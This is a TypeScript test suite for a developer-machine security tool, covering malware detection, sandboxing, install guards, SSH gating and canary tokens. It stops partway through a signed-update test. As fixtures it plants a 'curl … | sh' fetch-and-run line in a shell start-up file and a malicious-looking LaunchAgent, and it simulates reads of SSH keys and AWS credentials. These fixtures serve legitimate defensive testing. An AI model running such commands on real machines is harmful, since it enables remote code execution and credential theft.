import { describe, expect, test } from "bun:test";
import { mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { lookAlike } from "../src/sec/intel";
import { keyEncrypted, kubeUsers, secretNames } from "../src/sec/secrets";
import { selftest } from "../src/sec/selftest";
import { suspiciousLocation } from "../src/sec/collect/system";
import { sshGate } from "../src/setup";
import { verdictOf, type Finding } from "../src/sec/types";

const f = (severity: Finding["severity"]): Finding => ({ id: severity, rule: "x", severity, title: severity, detail: [] });

describe("detection", () => {
  test("selftest catches every planted case with no false alarms", async () => {
    const r = await selftest();
    const missed = r.cases.filter((c) => !c.caught).map((c) => c.name);
    expect(missed).toEqual([]);
    expect(r.falseAlarms.map((x) => x.title)).toEqual([]);
  });

  test("verdicts: high blocks, medium warns, low passes", () => {
    expect(verdictOf([f("low"), f("info")])).toBe("pass");
    expect(verdictOf([f("low"), f("medium")])).toBe("warn");
    expect(verdictOf([f("medium"), f("high")])).toBe("block");
    expect(verdictOf([f("critical")])).toBe("block");
  });

  test("look-alike names are caught, real names are not", () => {
    expect(lookAlike("npm", "axois")).toBe("axios");
    expect(lookAlike("npm", "cross-env")).toBeUndefined();
    expect(lookAlike("npm", "crossenv")).toBe("cross-env");
    expect(lookAlike("pip", "reqeusts")).toBe("requests");
    expect(lookAlike("pip", "requests")).toBeUndefined();
    expect(lookAlike("npm", "express-session")).toBeUndefined();
  });

  test("code running from temp, cache, downloads or unknown hidden folders is unusual; tool folders are not", () => {
    const h = "/Users/a";
    expect(suspiciousLocation("/tmp/x", h)).toBeDefined();
    expect(suspiciousLocation("/Users/a/.cache/.n/helper", h)).toBeDefined();
    expect(suspiciousLocation("/Users/a/Downloads/setup", h)).toBeDefined();
    expect(suspiciousLocation("/Users/a/.bun/bin/bun", h)).toBeUndefined();
    expect(suspiciousLocation("/Users/a/.cargo/bin/rg", h)).toBeUndefined();
    expect(suspiciousLocation("/Applications/Docker.app/Contents/MacOS/Docker", h)).toBeUndefined();
  });
});

describe("secrets never leak values", () => {
  test("env scanning returns names only, and skips placeholders", () => {
    // Fake values are assembled at runtime so secret scanners do not mistake this file for a leak.
    const live = ["sk", "live", "x".repeat(24)].join("_");
    const gh = "gh" + "p_" + "a".repeat(36);
    const names = secretNames(`API_KEY=${live}\nDEBUG=true\nGITHUB_TOKEN="${gh}"\nPASSWORD=changeme\nNAME=hello\n`);
    expect(names).toEqual(["API_KEY", "GITHUB_TOKEN"]);
    expect(JSON.stringify(names)).not.toContain(live);
  });

  test("ssh keys: passphrase detected from the header alone", () => {
    const mk = (cipher: string) => {
      const magic = Buffer.from("openssh-key-v1\0", "latin1");
      const len = Buffer.alloc(4);
      len.writeUInt32BE(cipher.length);
      return `-----BEGIN OPENSSH PRIVATE KEY-----\n${Buffer.concat([magic, len, Buffer.from(cipher), Buffer.alloc(40)]).toString("base64")}\n-----END OPENSSH PRIVATE KEY-----\n`;
    };
    expect(keyEncrypted(mk("none"))).toBe(false);
    expect(keyEncrypted(mk("aes256-ctr"))).toBe(true);
    expect(keyEncrypted("-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\n")).toBe(true);
  });

  test("kubeconfig: stored tokens and certificates are flagged, exec plugins are not", () => {
    const users = kubeUsers(`apiVersion: v1\nusers:\n- name: ci\n  user:\n    token: abc\n- name: sso\n  user:\n    exec:\n      command: aws\n- name: admin\n  user:\n    client-key-data: Zm9v\ncontexts: []\n`);
    expect(users.map((u) => `${u.name}:${u.how}`)).toEqual(["ci:token", "sso:exec", "admin:client certificate"]);
  });
});

describe("gate", () => {
  test("the ssh block blocks matching hosts unless preflight exits 0", () => {
    const g = sshGate(["prod-*", "*.internal"], ["/Users/a/.vswarm/bin/vswarm"]);
    expect(g).toContain('Match originalhost prod-*,*.internal !exec "/Users/a/.vswarm/bin/vswarm preflight --quiet --host %h"');
    expect(g).toContain("ProxyCommand");
  });

  test("preflight exit codes and --then: BLOCK stops the command, PASS runs it", async () => {
    const sec = mkdtempSync(join(tmpdir(), "vs-pre-"));
    const env = { ...process.env, VSWARM_SEC_DIR: sec, NO_COLOR: "1" };
    const cli = join(import.meta.dir, "../src/cli.ts");
    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
    last("block");
    let p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(3);
    expect(await new Response(p.stdout).text()).toBe("");
    last("pass");
    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(0);
    expect((await new Response(p.stdout).text()).trim()).toBe("RAN");
    last("warn");
    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--strict", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(2);
    // An open incident blocks even with a passing cached verdict.
    last("pass");
    writeFileSync(join(sec, "lock"), JSON.stringify({ incident: "t", at: Date.now(), reason: "test" }));
    p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--offline", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
    expect(await p.exited).toBe(3);
    // Stored files are owner-only.
    expect(statSync(join(sec, "last.json")).mode & 0o077).toBe(0);
    expect(readFileSync(join(sec, "lock"), "utf8")).toContain("test");
  }, 60_000);
});

import { existsSync, mkdirSync, readdirSync } from "node:fs";
import { run, type Ctx } from "../src/sec/ctx";
import { check } from "../src/sec/engine";
import { forBaseline, scan } from "../src/sec/scan";
import { respond } from "../src/sec/respond";
import { saveBaseline, loadLock } from "../src/sec/store";

describe("respond", () => {
  test("locks, keeps evidence with hashes, quarantines on yes, strips added lines, writes reports", async () => {
    const root = mkdtempSync(join(tmpdir(), "vs-resp-"));
    const home = join(root, "home");
    process.env.VSWARM_SEC_DIR = join(root, "sec");
    try {
      mkdirSync(join(home, "Library/LaunchAgents"), { recursive: true });
      writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
      const ctx: Ctx = { home, pathDirs: [], system: false, host: "t", user: "t", run: (cmd, t) => (cmd[0] === "plutil" ? run(cmd, t) : Promise.resolve(undefined)) };
      saveBaseline(forBaseline(await scan(ctx, { live: false })));
      writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\ncurl -s http://198.51.100.7/x | sh &\n");
      const plist = join(home, "Library/LaunchAgents/com.evil.plist");
      writeFileSync(plist, `<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>com.evil</string><key>ProgramArguments</key><array><string>${home}/.cache/x</string></array></dict></plist>`);
      const r = await check(ctx, { offline: true });
      expect(r.verdict).toBe("block");
      const inc = await respond(ctx, r, async () => true);
      expect(loadLock()?.incident).toBe(inc.id);
      expect(existsSync(plist)).toBe(false);
      expect(readdirSync(join(inc.dir, "quarantine")).some((f) => f.endsWith("com.evil.plist"))).toBe(true);
      expect(readFileSync(join(home, ".zshrc"), "utf8")).toBe("alias ll='ls -la'\n");
      expect(inc.evidence.find((e) => e.path === plist)?.sha256).toMatch(/^[0-9a-f]{64}$/);
      expect(readFileSync(join(inc.dir, "report.md"), "utf8")).toContain("com.evil");
      expect(readFileSync(join(inc.dir, "evidence/MANIFEST.sha256"), "utf8")).toContain("com.evil.plist");
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  }, 60_000);
});

import { staticCheck } from "../src/sec/try/static";
import { tryIt } from "../src/sec/try";

describe("vswarm try", () => {
  const fixture = (n: string) => join(import.meta.dir, "fixtures", n);

  test("static check flags the fake interview repo and stays quiet on the clean app", () => {
    const bad = staticCheck(fixture("fake-interview")).map((f) => f.title);
    expect(bad.some((t) => t.includes("tailwind.config.js") && t.includes("eval"))).toBe(true);
    expect(bad.some((t) => t.includes("postinstall"))).toBe(true);
    expect(bad.some((t) => t.includes("folder is opened"))).toBe(true);
    expect(staticCheck(fixture("clean-app"))).toEqual([]);
  });

  const sandbox = process.platform === "darwin" || (process.platform === "linux" && !!Bun.which("bwrap"));
  test.skipIf(!sandbox)("the sandbox stops the fake interview repo and records what it tried", async () => {
    const dir = mkdtempSync(join(tmpdir(), "vs-try-"));
    process.env.VSWARM_TRY_DIR = dir;
    try {
      const r = await tryIt(fixture("fake-interview"), ["node", "./tailwind.config.js"], { net: "none", ask: async () => true, yes: true });
      const titles = r.runFindings.map((f) => [f.title, ...f.detail].join("\n")).join("\n");
      expect(r.verdict).toBe("block");
      expect(titles).toContain("login job");
      expect(titles).toContain("shell start-up file");
      expect(titles).toContain("203.0.113.9");
      // macOS logs a denied read only when the file exists (CI machines have no SSH key); strace logs every attempt.
      const home = require("node:os").homedir();
      if (r.logRead && (process.platform === "linux" || existsSync(join(home, ".ssh/id_ed25519")))) expect(titles).toContain("SSH keys");
      if (process.platform === "linux" && r.logRead) expect(titles).toContain("background process");
      // Nothing reached the real home.
      expect(existsSync(join(home, "Library/LaunchAgents/com.dev.helper.plist"))).toBe(false);
      expect(existsSync(join(home, ".config/systemd/user/dev-helper.service"))).toBe(false);
    } finally {
      delete process.env.VSWARM_TRY_DIR;
    }
  }, 120_000);
});

describe("linux persistence", () => {
  test("systemd units: %h is the home folder, links in *.wants count, packaged links do not", async () => {
    const { autostart } = require("../src/sec/collect/system");
    const { symlinkSync } = require("node:fs");
    const home = mkdtempSync(join(tmpdir(), "vs-sd-"));
    const dir = join(home, ".config/systemd/user");
    mkdirSync(join(dir, "default.target.wants"), { recursive: true });
    writeFileSync(join(home, "x.service"), "[Service]\nExecStart=%h/.cache/.x/agent\n");
    symlinkSync(join(home, "x.service"), join(dir, "default.target.wants/x.service"));
    symlinkSync("/usr/lib/systemd/user/pipewire.service", join(dir, "default.target.wants/pipewire.service"));
    const items = await autostart({ home, system: false, pathDirs: [], run: async () => undefined, host: "t", user: "t" });
    expect(items.map((i: any) => `${i.name} ${i.meta.program}`)).toEqual([`x.service ${home}/.cache/.x/agent`]);
  });
});

describe("linux sandbox", () => {
  const { traceDenials, bwrapArgs } = require("../src/sec/try/linux");
  const box = { dir: "/home/u/.vswarm/try/x", work: "/home/u/.vswarm/try/x/work", home: "/home/u/.vswarm/try/x/home", tmp: "/home/u/.vswarm/try/x/tmp", netlog: "" };

  test("strace lines become the same attempts the macOS sandbox log reports", () => {
    const d = mkdtempSync(join(tmpdir(), "vs-trace-"));
    const log = join(d, "trace.log");
    writeFileSync(log, [
      `7 execve("/usr/bin/node", ["node", "x.js"], 0x7ffd /* 20 vars */) = 0`,
      `7 openat(AT_FDCWD, "/home/u/.ssh/id_ed25519", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)`,
      `7 openat(AT_FDCWD, "/home/u/.vswarm/try/x/work/a.js", O_RDONLY) = 3`,
      `7 openat(AT_FDCWD, "/etc/cron.d/x", O_WRONLY|O_CREAT|O_TRUNC, 0644) = -1 EROFS (Read-only file system)`,
      `7 openat(AT_FDCWD, "/tmp/scratch", O_WRONLY|O_CREAT, 0644) = 4`,
      `7 openat(AT_FDCWD, "/home/package.json", O_RDWR|O_CLOEXEC) = -1 ENOENT (No such file or directory)`,
      `7 openat(AT_FDCWD, "/home/u/.config/autostart/x.desktop", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 4`,
      `7 openat(AT_FDCWD, "/sys/kernel/debug/tracing/trace_marker", O_WRONLY) = -1 EACCES (Permission denied)`,
      `7 connect(5, {sa_family=AF_INET, sin_port=htons(1224), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH (Network is unreachable)`,
      `7 connect(6, {sa_family=AF_INET, sin_port=htons(3128), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`,
      `7 connect(8, {sa_family=AF_UNIX, sun_path="/run/user/1000/bus"}, 110) = -1 ENOENT (No such file or directory)`,
      `7 openat(AT_FDCWD, "/home/u/.vswarm/try/x/home/.aws/credentials", O_RDONLY) = -1 ENOENT (No such file or directory)`,
      `7 openat(AT_FDCWD, "/home/u/.vswarm/try/x/home/.npmrc", O_RDONLY) = -1 ENOENT (No such file or directory)`,
      `9 setsid()                         = 9`,
      `9 execve("/usr/bin/sleep", ["sleep", "20"], 0x7ffd /* 20 vars */) = 0`,
    ].join("\n"));
    expect(traceDenials(log, "/home/u", box).map((x: any) => `${x.op} ${x.target}`)).toEqual([
      "file-read /home/u/.ssh/id_ed25519", "file-write /etc/cron.d/x", "file-write /home/u/.config/autostart/x.desktop", "network-outbound 203.0.113.9:1224", "unix-connect /run/user/1000/bus", "file-read /home/u/.aws/credentials", "setsid sleep",
    ]);
  });

  test("bubblewrap hides every home and /run, keeps the try folder, and has no network", () => {
    const a = bwrapArgs("/home/u", box, { tools: ["/home/u/.bun"], bun: "/home/u/.bun/bin/bun", interactive: false }).join(" ");
    expect(a).toContain("--unshare-net");
    expect(a).toContain("--unshare-pid");
    expect(a).toContain("--new-session");
    expect(a).toContain(`--bind ${box.dir} ${box.dir}`);
    expect(a).toContain("--ro-bind /home/u/.bun /home/u/.bun");
    expect(a.indexOf("--tmpfs /home")).toBeLessThan(a.indexOf("--bind " + box.dir));
  });
});

describe("short-lived SSH certificates", () => {
  test.skipIf(!existsSync("/usr/sbin/sshd"))("vswarm cert issues only after preflight; sshd accepts the cert and refuses the bare key", async () => {
    const root = mkdtempSync(join(tmpdir(), "vs-ca-"));
    const sec = join(root, "sec"), ca = join(root, "ca");
    mkdirSync(sec, { recursive: true });
    const env = { ...process.env, VSWARM_SEC_DIR: sec, VSWARM_CA_DIR: ca, NO_COLOR: "1" };
    const cli = join(import.meta.dir, "../src/cli.ts");
    const vs = async (...a: string[]) => {
      const p = Bun.spawn([process.execPath, cli, ...a], { env, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
      return { code: await p.exited, err: await new Response(p.stderr).text() };
    };
    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
    // A throwaway CA without a passphrase, for this test only.
    expect((await vs("ca", "init", "--no-passphrase", "--ttl", "5m")).code).toBe(0);
    last("block");
    expect((await vs("cert", "--quiet")).code).toBe(3);
    expect(existsSync(join(ca, "session-cert.pub"))).toBe(false);
    last("pass");
    expect((await vs("cert")).code).toBe(0);
    expect(existsSync(join(ca, "session-cert.pub"))).toBe(true);

    // A real sshd on localhost that trusts only the CA.
    const sshd = join(root, "sshd");
    mkdirSync(sshd);
    const user = require("../src/sec/ctx").whoami();
    await Bun.spawn(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", join(sshd, "host_key")]).exited;
    writeFileSync(join(sshd, "principals"), user + "\n");
    const port = 20000 + Math.floor(Math.random() * 20000);
    writeFileSync(join(sshd, "config"), [
      `Port ${port}`, "ListenAddress 127.0.0.1", `HostKey ${join(sshd, "host_key")}`, `PidFile ${join(sshd, "pid")}`, "UsePAM no", "StrictModes no",
      "PasswordAuthentication no", "KbdInteractiveAuthentication no", "AuthorizedKeysFile none",
      `TrustedUserCAKeys ${join(ca, "ca_key.pub")}`, `AuthorizedPrincipalsFile ${join(sshd, "principals")}`,
    ].join("\n") + "\n");
    expect(await Bun.spawn(["/usr/sbin/sshd", "-f", join(sshd, "config"), "-E", join(sshd, "log")]).exited).toBe(0);
    await Bun.sleep(800);
    const ssh = async (certFile: string) => {
      const p = Bun.spawn(["ssh", "-F", "/dev/null", "-p", String(port), "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-o", "IdentitiesOnly=yes", "-i", join(ca, "session"), "-o", `CertificateFile=${certFile}`, "127.0.0.1", "echo OK"], { stdout: "pipe", stderr: "pipe" });
      return (await new Response(p.stdout).text()).trim();
    };
    try {
      expect(await ssh(join(ca, "session-cert.pub"))).toBe("OK");
      expect(await ssh("/dev/null")).toBe("");
    } finally {
      try { process.kill(Number(readFileSync(join(sshd, "pid"), "utf8"))); } catch {}
    }
  }, 60_000);

  test("gate --cert writes the session key and certificate into the ssh block", () => {
    const g = sshGate(["prod-*"], ["/v/vswarm"], { cert: { key: "/v/ca/session", cert: "/v/ca/session-cert.pub" } });
    expect(g).toContain('!exec "/v/vswarm cert --quiet --host %h"');
    expect(g).toContain("CertificateFile /v/ca/session-cert.pub");
  });
});

import { plantAws, plantDns, removeCanary } from "../src/sec/canary";
import { secrets as findSecrets } from "../src/sec/secrets";

describe("canary tokens", () => {
  test("planted decoys are not reported as exposure, real keys still are, and removal restores the files", async () => {
    const root = mkdtempSync(join(tmpdir(), "vs-can-"));
    const home = join(root, "home");
    process.env.VSWARM_SEC_DIR = join(root, "sec");
    try {
      mkdirSync(join(home, ".aws"), { recursive: true });
      mkdirSync(join(home, ".ssh"), { recursive: true });
      // Fake values built at runtime; no real or real-looking credential sits in the source.
      const key = (tag: string) => ["AKIA", tag.padEnd(16, "0").toUpperCase()].join("");
      const secret = "s".repeat(40);
      const original = `[default]\naws_access_key_id = ${key("REALLOOKING")}\naws_secret_access_key = ${secret}\n`;
      writeFileSync(join(home, ".aws/credentials"), original);
      writeFileSync(join(home, ".ssh/config"), "Host work\n    HostName 10.0.0.5\n");
      const a = plantAws(key("CANARY"), secret, { home });
      const d = plantDns("abc123.canarytokens.com", { home });
      expect(readFileSync(join(home, ".aws/credentials"), "utf8")).toContain("[prod-backup-admin]");
      expect(readFileSync(join(home, ".ssh/config"), "utf8").startsWith("# >>> vswarm canary")).toBe(true);
      const ctx = { home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined } as any;
      const aws = (await findSecrets(ctx)).find((f) => f.title.startsWith("AWS"));
      expect(aws?.detail[0]).toBe("profiles: default");
      removeCanary(a.id);
      removeCanary(d.id);
      expect(readFileSync(join(home, ".aws/credentials"), "utf8").trim()).toBe(original.trim());
      expect(readFileSync(join(home, ".ssh/config"), "utf8").trim()).toBe("Host work\n    HostName 10.0.0.5");
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  });
});

describe("install guard", () => {
  const { plan, judge, checkInstall, guardBlock, npmSpec, pipSpec } = require("../src/sec/pkg");
  const DAY = 86_400_000;

  test("reads package names from package-manager command lines", () => {
    const n = (tool: string, line: string) => plan(tool, line.split(" ").filter(Boolean), "/nonexistent").wants.map((w: any) => w.name + (w.version ? "@" + w.version : ""));
    expect(n("npm", "install -D axois lodash@4.17.21 --registry https://r.example")).toEqual(["axois", "lodash@4.17.21"]);
    expect(n("pnpm", "add @types/node@20.1.0")).toEqual(["@types/node@20.1.0"]);
    expect(n("npx", "-y create-vite@latest my-app")).toEqual(["create-vite"]);
    expect(n("pip", "install -r missing.txt reqeusts==2.0.0 'flask[async]'")).toEqual(["reqeusts@2.0.0"]);
    expect(n("pip", "install flask[async] -e .")).toEqual(["flask"]);
    expect(n("uv", "pip install httpx")).toEqual(["httpx"]);
    expect(n("brew", "install jq someone/tools/thing")).toEqual(["jq", "someone/tools/thing"]);
    expect(plan("npm", ["run", "dev"]).skip).toBe(true);
    expect(plan("pip", ["list"]).skip).toBe(true);
    expect(plan("brew", ["upgrade"]).skip).toBe(true);
    expect(npmSpec("github:a/b").outside).toBe("github:a/b");
    expect(npmSpec("alias@npm:real@1.2.3")).toMatchObject({ name: "real", version: "1.2.3" });
    expect(pipSpec("git+https://x/y.git")?.outside).toBeDefined();
  });

  test("a bare npm install reads the lockfile", () => {
    const d = mkdtempSync(join(tmpdir(), "vswarm-lock-"));
    writeFileSync(join(d, "package-lock.json"), JSON.stringify({ packages: { "": { name: "app" }, "node_modules/is-number": { version: "7.0.0", resolved: "https://registry.npmjs.org/is-number/-/is-number-7.0.0.tgz" }, "node_modules/x": { version: "1.0.0", resolved: "https://evil.example/x.tgz" } } }));
    const p = plan("npm", ["install"], d);
    expect(p.wants.map((w: any) => `${w.name}@${w.version}${w.outside ? " outside" : ""}`)).toEqual(["is-number@7.0.0", "x@1.0.0 outside"]);
  });

  test("judging registry facts", () => {
    const now = Date.now();
    const rules = (w: any, f: any) => judge(w, f, now).map((x: any) => `${x.rule}:${x.severity}`);
    const old = { exists: true, version: "1.0.0", versionAt: now - 400 * DAY, createdAt: now - 900 * DAY, weeklyDownloads: 1e6 };
    expect(rules({ eco: "npm", name: "chalk" }, old)).toEqual([]);
    expect(rules({ eco: "npm", name: "esbuild" }, { ...old, scripts: ["postinstall: node install.js"] })).toEqual(["pkg-scripts:low"]);
    expect(rules({ eco: "npm", name: "chalk" }, { ...old, versionAt: now - 3 * 3_600_000 })).toEqual(["pkg-fresh:medium"]);
    expect(rules({ eco: "npm", name: "tiny-helper-x" }, { ...old, createdAt: now - 5 * DAY, weeklyDownloads: 12 })).toEqual(["pkg-new:medium"]);
    expect(rules({ eco: "npm", name: "tiny-helper-x" }, { ...old, createdAt: now - 5 * DAY, weeklyDownloads: 12, scripts: ["postinstall: node x.js"] })).toEqual(["pkg-new:high"]);
    expect(rules({ eco: "pip", name: "reqeusts" }, { exists: false })).toEqual(["pkg-missing:high"]);
    expect(rules({ eco: "pip", name: "made-up-zzq" }, { exists: false })).toEqual(["pkg-missing:low"]);
    expect(rules({ eco: "npm", name: "axois" }, old)).toEqual(["pkg-lookalike:high"]);
    expect(rules({ eco: "brew", name: "a/b/c", tap: "a/b" }, undefined)).toEqual(["pkg-tap:medium"]);
    expect(rules({ eco: "brew", name: "jq" }, undefined)).toEqual([]);
  });

  test("checkInstall asks the registry and OSV, blocks malicious, and goes ahead when offline", async () => {
    const d = mkdtempSync(join(tmpdir(), "vswarm-pkg-"));
    const cache = join(d, "osv.json");
    writeFileSync(cache, JSON.stringify({ "npm:evil-pkg@1.0.0": { at: Date.now(), mal: ["MAL-2099-1"] }, "npm:good@2.0.0": { at: Date.now(), mal: [] } }));
    const seen: string[] = [];
    const get = async (url: string) => {
      seen.push(new URL(url).host);
      const man = /registry\.npmjs\.org\/([^/]+)\//.exec(url)?.[1];
      const body = man === "evil-pkg" ? { version: "1.0.0" } : man === "good" ? { version: "2.0.0" } : url.includes("downloads") ? { downloads: 1e6 } : { versions: [{ versionKey: { version: "2.0.0" }, publishedAt: "2020-01-01T00:00:00Z" }, { versionKey: { version: "1.0.0" }, publishedAt: "2019-01-01T00:00:00Z" }] };
      return { status: 200, json: async () => body };
    };
    const r = await checkInstall(plan("npm", ["install", "evil-pkg", "good"], d), { get, osvCache: cache, offline: false });
    expect(r.verdict).toBe("block");
    expect(r.findings.map((f: any) => f.rule)).toEqual(["pkg-malicious"]);
    expect(new Set(seen)).toEqual(new Set(["registry.npmjs.org", "api.npmjs.org", "api.deps.dev"]));
    const down = await checkInstall(plan("npm", ["install", "good"], d), { get: async () => { throw new Error("offline"); }, osvCache: cache });
    expect(down.verdict).toBe("pass");
    expect(down.notes.join()).toContain("could not ask the registry");
  });

  test("a malicious package deep in the tree is found, with the package that pulls it in", async () => {
    const d = mkdtempSync(join(tmpdir(), "vswarm-tree-"));
    const cache = join(d, "osv.json");
    writeFileSync(cache, JSON.stringify({ "npm:evil-helper@2.0.0": { at: Date.now(), mal: ["MAL-2099-2"] } }));
    const get = async (url: string) => {
      if (url.includes(":dependencies")) return { status: 200, json: async () => ({
        nodes: [{ versionKey: { name: "nice-lib", version: "1.0.0" } }, { versionKey: { name: "middle", version: "3.1.0" } }, { versionKey: { name: "evil-helper", version: "2.0.0" } }, { versionKey: { name: "axois", version: "1.0.0" } }],
        edges: [{ fromNode: 0, toNode: 1 }, { fromNode: 1, toNode: 2 }, { fromNode: 0, toNode: 3 }] }) };
      if (url.includes("registry.npmjs.org")) return { status: 200, json: async () => ({ version: "1.0.0" }) };
      if (url.includes("downloads")) return { status: 200, json: async () => ({ downloads: 1e6 }) };
      return { status: 200, json: async () => ({ versions: [{ versionKey: { version: "1.0.0" }, publishedAt: "2020-01-01T00:00:00Z" }] }) };
    };
    const r = await checkInstall(plan("npm", ["install", "nice-lib"], d), { get, osvCache: cache });
    expect(r.deps).toBe(3);
    expect(r.verdict).toBe("block");
    const mal = r.findings.find((f: any) => f.rule === "pkg-malicious");
    expect(mal.title).toContain("evil-helper@2.0.0 (a dependency)");
    expect(mal.detail).toContain("pulled in by nice-lib → middle");
    expect(r.findings.some((f: any) => f.title === "nice-lib pulls in axois, which looks like axios")).toBe(true);
  });

  test("the shell wrapper checks installs only, and stops when vswarm says no", async () => {
    const d = mkdtempSync(join(tmpdir(), "vswarm-guard-"));
    const log = join(d, "log");
    // A stand-in vswarm that refuses "evil", and a stand-in npm that records what ran.
    writeFileSync(join(d, "vswarm"), `#!/bin/sh\necho "vswarm $*" >> ${log}\ncase "$*" in *evil*) exit 3;; esac\n`, { mode: 0o755 });
    writeFileSync(join(d, "npm"), `#!/bin/sh\necho "npm $*" >> ${log}\n`, { mode: 0o755 });
    const rc = join(d, "rc");
    writeFileSync(rc, guardBlock(join(d, "vswarm")));
    // No start-up files (-f, --norc): a user's .zshenv can put the real npm back on PATH. Run inside the temp folder
    // with a temp HOME, so even an escape could not touch this repository.
    for (const sh of [["zsh", "-f"], ["bash", "--norc", "--noprofile"]]) {
      if (!Bun.which(sh[0])) continue;
      writeFileSync(log, "");
      const p = Bun.spawn([...sh, "-c", `. ${rc}; npm run dev; npm install good; npm i evil; echo "status $?" >> ${log}`], { cwd: d, env: { PATH: `${d}:/usr/bin:/bin`, HOME: d }, stdout: "pipe", stderr: "pipe" });
      expect(await p.exited).toBe(0);
      expect(readFileSync(log, "utf8").trim().split("\n")).toEqual(["npm run dev", "vswarm pkg npm -- install good", "npm install good", "vswarm pkg npm -- i evil", "status 3"]);
    }
    // With Socket Firewall on PATH, an approved install runs through it; VSWARM_SFW=off skips it.
    writeFileSync(join(d, "sfw"), `#!/bin/sh\necho "sfw $*" >> ${log}\n`, { mode: 0o755 });
    writeFileSync(log, "");
    const p = Bun.spawn(["bash", "--norc", "--noprofile", "-c", `. ${rc}; npm install good; VSWARM_SFW=off npm install good`], { cwd: d, env: { PATH: `${d}:/usr/bin:/bin`, HOME: d }, stdout: "pipe", stderr: "pipe" });
    await p.exited;
    expect(readFileSync(log, "utf8").trim().split("\n")).toEqual(["vswarm pkg npm -- install good", "sfw npm install good", "vswarm pkg npm -- install good", "npm install good"]);
  });
});

describe("AI agents and MCP", () => {
  const { literalSecrets, agents } = require("../src/sec/collect/agents");
  const { evaluate } = require("../src/sec/rules");

  test("tokens pasted into MCP configs are named, references are not", () => {
    const tok = ["gh", "p_", "x".repeat(36)].join("");
    expect(literalSecrets({ env: { GITHUB_TOKEN: tok, API_BASE: "https://api.example.com/v1", OTHER_KEY: "${OTHER_KEY}" }, headers: { Authorization: "Bearer " + "y".repeat(30) } })).toEqual(["GITHUB_TOKEN", "Authorization"]);
  });

  test("an old baseline does not make every MCP server look new, a current one does", async () => {
    const home = mkdtempSync(join(tmpdir(), "vs-ag-"));
    mkdirSync(join(home, ".cursor"), { recursive: true });
    writeFileSync(join(home, ".cursor/mcp.json"), JSON.stringify({ mcpServers: { local: { url: "http://127.0.0.1:9000/mcp" }, remote: { url: "http://mcp.example.net/mcp" } } }));
    const items = await agents({ home, system: false, pathDirs: [], run: async () => undefined, host: "t", user: "t" });
    const scan = { version: 1, host: "t", user: "t", home, at: 0, items, texts: {}, gaps: {}, covers: ["mcp"] };
    const base = (covers?: string[]) => ({ ...scan, items: [], covers });
    const rules = async (b: any) => (await evaluate({ scan, baseline: b, malicious: [], secrets: [] })).map((f: any) => f.rule).sort();
    expect(await rules(base(undefined))).toEqual(["agent-http"]);
    expect(await rules(base(["mcp"]))).toEqual(["agent-http", "agent-mcp-new", "agent-mcp-new"]);
  });
});

describe("signed updates", () => {
  test("updates only to tags signed by the pinned key; unsigned, other-key and older tags are refused", async () => {
    const { secureUpdate } = require("../src/sec/update");
    const root = mkdtempSync(join(tmpdir(), "vs-upd-"));
    const sh = async (cwd: string, ...cmd: string[]) => {
      const p = Bun.spawn(cmd, { cwd, stdout: "pipe", stderr: "pipe", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" } });
      const code = await p.exited;
      if (code !== 0) throw new Error(`${cmd.join(" ")}: ${await new Response(p.stderr).text()}`);
    };
    for (const k of ["a", "b"]) await sh(root, "ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", k, "-f", join(root, k));
    const signer = (k: string) => `${k}@test namespaces="git" ${readFileSync(join(root, `${k}.pub`), "utf8").trim()}\n`;
    const dev = join(root, "dev"), origin = join(root, "origin.git"), app = join(root, "app");
    await sh(root, "git", "init", "-q", "--bare", "-b", "main", origin);
    await sh(root, "git", "init", "-q", "-b", "main", dev);
    const g = (...a: string[]) => sh(dev, "git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "gpg.format=ssh", ...a);
    const release = async (v: string, key?: string, signers = signer("a")) => {
      mkdirSync(join(dev, "trust"), { recursive: true });
      writeFileSync(join(dev, "trust/allowed_signers"), signers);
      writeFileSync(join(dev, "v"), v);
      await g("add", "-A");
      await g("commit", "-q", "-m", v);
      await (key ? g("-c", `user.signingkey=${join(root, key)}`, "tag", "-s", v, "-m", v) : g("tag", "-a", v, "-m", v));
      await g("push", "-q", origin, "main", v);
    };
    await release("v1.0.0", "a");
    await sh(root, "git", "clone", "-q", origin, app);
    const pin = join(root, "pin", "allowed_signers");
    const up = (cur: string) => secureUpdate(app, cur, pin);

    // The fresh clone already sits on v1.0.0; the first check pins the key that release lists.
    expect((await up("0.9.0")).status).toBe("current");
    expect(readFileSync(pin, "utf8")).toContain("a@test");
    await release("v1.1.0");                                   // unsigned
    expect((await up("1.0.0")).status).toBe("refused");
